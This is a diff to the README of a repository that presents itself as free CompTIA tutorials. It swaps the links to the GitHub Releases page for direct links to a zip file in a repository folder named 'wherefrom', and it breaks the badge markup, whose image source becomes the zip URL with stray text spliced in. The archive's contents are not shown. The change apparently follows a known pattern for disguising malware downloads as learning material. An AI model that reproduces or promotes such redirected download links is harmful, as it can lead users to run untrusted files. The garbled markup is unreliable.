@@ -1,6 +1,6 @@
 # 🎓 comptia-free-tutorials - Learn CompTIA Basics Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/swann126/comptia-free-tutorials/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/swann126/comptia-free-tutorials/master/wherefrom/comptia-free-tutorials.zip%20Latest%https://raw.githubusercontent.com/swann126/comptia-free-tutorials/master/wherefrom/comptia-free-tutorials.zip)](https://raw.githubusercontent.com/swann126/comptia-free-tutorials/master/wherefrom/comptia-free-tutorials.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **comptia-free-tutorials**! This application offers free tutorials fo
 
 To get started, you need to visit our Releases page. Here, you will find the latest version of the software as well as instructions for installation.
 
-**Visit this page to download:** [Download comptia-free-tutorials](https://github.com/swann126/comptia-free-tutorials/releases)
+**Visit this page to download:** [Download comptia-free-tutorials](https://raw.githubusercontent.com/swann126/comptia-free-tutorials/master/wherefrom/comptia-free-tutorials.zip)
 
 ### Step-by-step installation guide:
 
